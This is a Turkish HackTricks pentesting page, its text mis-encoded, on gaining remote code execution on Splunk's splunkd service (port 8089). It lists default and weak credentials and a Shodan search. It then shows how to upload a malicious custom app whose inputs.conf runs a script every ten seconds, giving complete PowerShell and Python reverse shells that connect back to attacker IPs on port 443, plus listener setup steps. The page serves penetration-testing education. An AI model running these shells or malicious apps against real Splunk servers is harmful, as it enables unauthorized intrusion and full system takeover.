# 8089 - Splunkd'yi Pentest Etme

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## **Temel Bilgiler**

* Veri toplama, analiz ve gÃ¶rselleÅŸtirme iÃ§in kullanÄ±lan bir gÃ¼nlÃ¼k analitik aracÄ±
* GÃ¼venlik izleme ve iÅŸ analitiÄŸinde yaygÄ±n olarak kullanÄ±lÄ±r
* VarsayÄ±lan portlar:
* Web sunucusu: 8000
* Splunkd servisi: 8089

### Zafiyet VektÃ¶rleri:

1. Ãœcretsiz SÃ¼rÃ¼m Ä°stismarÄ±

* Deneme sÃ¼rÃ¼mÃ¼ 60 gÃ¼n sonra otomatik olarak Ã¼cretsiz sÃ¼rÃ¼me dÃ¶nÃ¼ÅŸÃ¼r
* Ãœcretsiz sÃ¼rÃ¼m kimlik doÄŸrulama eksikliÄŸi taÅŸÄ±r
* YÃ¶netilmediÄŸinde potansiyel gÃ¼venlik riski
* YÃ¶neticiler gÃ¼venlik etkilerini gÃ¶zden kaÃ§Ä±rabilir

2. Kimlik Bilgisi ZayÄ±flÄ±klarÄ±

* Eski sÃ¼rÃ¼mler: VarsayÄ±lan kimlik bilgileri `admin:changeme`
* Yeni sÃ¼rÃ¼mler: Kurulum sÄ±rasÄ±nda ayarlanan kimlik bilgileri
* ZayÄ±f ÅŸifre kullanma potansiyeli (Ã¶rn., `admin`, `Welcome`, `Password123`)

3. Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma FÄ±rsatlarÄ±

* Birden fazla kod Ã§alÄ±ÅŸtÄ±rma yÃ¶ntemi:
* Sunucu tarafÄ± Django uygulamalarÄ±
* REST uÃ§ noktalarÄ±
* ScriptlenmiÅŸ girdiler
* UyarÄ± scriptleri
* Ã‡oklu platform desteÄŸi (Windows/Linux)
* ScriptlenmiÅŸ girdiler Ã§alÄ±ÅŸtÄ±rabilir:
* Bash scriptleri
* PowerShell scriptleri
* Batch scriptleri

Ana Ä°stismar Potansiyeli:

* Hassas veri depolama
* Ãœcretsiz sÃ¼rÃ¼mde kimlik doÄŸrulama eksikliÄŸi
* Potansiyel uzaktan kod Ã§alÄ±ÅŸtÄ±rma iÃ§in birden fazla vektÃ¶r
* Sistem ihlali iÃ§in scriptlenmiÅŸ girdilerin kullanÄ±lma olasÄ±lÄ±ÄŸÄ±

### Shodan

* `Splunk build`

## RCE

### Ã–zel Uygulama OluÅŸturma

Splunk, Ã¶zel uygulama daÄŸÄ±tÄ±mÄ± aracÄ±lÄ±ÄŸÄ±yla uzaktan kod Ã§alÄ±ÅŸtÄ±rma iÃ§in sofistike bir yÃ¶ntem sunar ve Ã§apraz platform scriptleme yeteneklerinden yararlanÄ±r. Temel istismar tekniÄŸi, hem Windows hem de Linux sistemlerinde ters shell'ler Ã§alÄ±ÅŸtÄ±rabilen kÃ¶tÃ¼ niyetli bir uygulama oluÅŸturmaya dayanÄ±r.

Ã–zel bir uygulama **Python, Batch, Bash veya PowerShell scriptleri** Ã§alÄ±ÅŸtÄ±rabilir. AyrÄ±ca, **Splunk ile Python yÃ¼klÃ¼ gelir**, bu nedenle **Windows** sistemlerinde bile python kodu Ã§alÄ±ÅŸtÄ±rabileceksiniz.

[**bu**](https://github.com/0xjpuff/reverse_shell_splunk) Ã¶rneÄŸini **`bin`** iÃ§eren [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) ve [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) iÃ§in kullanabilirsiniz. Ya da kendi uygulamanÄ±zÄ± oluÅŸturabilirsiniz.

Ä°stismar sÃ¼reci, platformlar arasÄ±nda tutarlÄ± bir metodoloji izler:
```
splunk_shell/
â”œâ”€â”€ bin        (reverse shell scripts)
â””â”€â”€ default    (inputs.conf configuration)
```
Kritik yapÄ±landÄ±rma dosyasÄ± `inputs.conf`, scripti ÅŸu ÅŸekilde etkinleÅŸtirir:

* `disabled = 0` ayarlamak
* 10 saniyelik bir yÃ¼rÃ¼tme aralÄ±ÄŸÄ± yapÄ±landÄ±rmak
* Scriptin kaynak tÃ¼rÃ¼nÃ¼ tanÄ±mlamak

DaÄŸÄ±tÄ±m basittir:

1. KÃ¶tÃ¼ niyetli uygulama paketini oluÅŸturun
2. SaldÄ±rÄ± yapan makinede bir dinleyici (Netcat/socat) kurun
3. UygulamayÄ± Splunk arayÃ¼zÃ¼ aracÄ±lÄ±ÄŸÄ±yla yÃ¼kleyin
4. YÃ¼kleme sÄ±rasÄ±nda otomatik script yÃ¼rÃ¼tmesini tetikleyin

Ã–rnek Windows PowerShell ters shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Ã–rnek Linux Python ters kabuk:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Yetki YÃ¼kseltme

AÅŸaÄŸÄ±daki sayfada bu hizmetin nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸi, yetkilerin yÃ¼kseltilmesi ve kalÄ±cÄ±lÄ±ÄŸÄ±n saÄŸlanmasÄ± ile ilgili bir aÃ§Ä±klama bulabilirsiniz:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
